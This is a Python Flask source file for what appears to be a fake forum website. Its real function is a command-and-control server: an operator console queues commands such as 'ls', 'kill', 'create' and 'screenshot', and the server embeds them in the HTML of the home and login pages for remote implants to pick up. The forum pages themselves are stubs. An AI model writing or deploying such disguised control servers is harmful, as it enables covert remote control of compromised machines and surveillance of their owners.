from flask import Flask, render_template, url_for
from threading import Thread


app = Flask(__name__, template_folder="static", static_folder="styles")

commands = list()
allowed_commands = ["ls", "kill", "create", "screenshot"]

def get_command():
    # Call only if there is waiting command(s) else return None
    if len(commands) == 0: return ""
    cmd = commands.pop(0)
    return cmd



@app.route("/", methods=["GET"])
@app.route("/home", methods=["GET"])
def home():
    return render_template("home.html", 
                        MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="menubar.css")), 
                        STYLE=url_for('static', filename="base.css"),
                        COMMANDS= render_template("base.html", COMMANDS=f'[{get_command()}]') if len(commands) > 0 else ""
                        )




@app.route("/login", methods=["GET", "POST"])
def login():
    return render_template("home.html", 
                            MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="menubar.css")), 
                            STYLE=url_for('static', filename="base.css"),
                            COMMANDS=render_template("base.html", COMMANDS=get_command()) if len(commands) > 0 else "",
                            ADD=render_template("form.html",
                                CLASS="formLogin",
                                CONTENT=render_template("form_input.html", LABEL="Pseudo", TYPE="text") 
                                        + render_template("form_input.html", LABEL="Password", TYPE="password")
                            )
                        )

@app.route("/signin", methods=["GET", "POST"])
def signin():
    return render_template("home.html", 
                            MENU=render_template("menu/menubar.html", STYLE=url_for('static', filename="menubar.css")), 
                            STYLE=url_for('static', filename="base.css"),
                            COMMANDS=render_template("base.html", COMMANDS=get_command()) if len(commands) > 0 else "",
                            ADD=render_template("form.html",
                                CLASS="formLogin",
                                CONTENT=render_template("form_input.html", LABEL="Pseudo", TYPE="text") 
                                        + render_template("form_input.html", LABEL="Password", TYPE="password")
                                        + render_template("form_input.html", LABEL="Password confirmation", TYPE="password")
                            )
                        )


@app.route("/logout", methods=["GET", "POST"])


@app.route("/forum", methods=["GET"])
@app.route("/profile", methods=["GET"])
@app.route("/profile/<user_id>", methods=["GET"])
@app.route("/forum/post", methods=["GET", "POST"])
@app.route("/forum/post/<post_id>", methods=["GET", "POST"])
def test():
    return "Hello World!"



def start():
    print("Flask server started")
    app.run(host="0.0.0.0")



def operator_interface():
    while True:
        command = input("Enter a command:")
        print(command)
        if len(command.split()) > 0:
            if command.split()[0] in allowed_commands:
                commands.append(command)
                print("Command added to next send")
            elif command == "exit":
                print("Operator interface closed. Press CTRL+C to quit.")
                exit(0)
            else:
                print("Command not recognized")




if __name__ == "__main__":
    server = Thread(target=start)
    interface = Thread(target=operator_interface)
    interface.start()
    server.start()
    server.join()
    interface.join()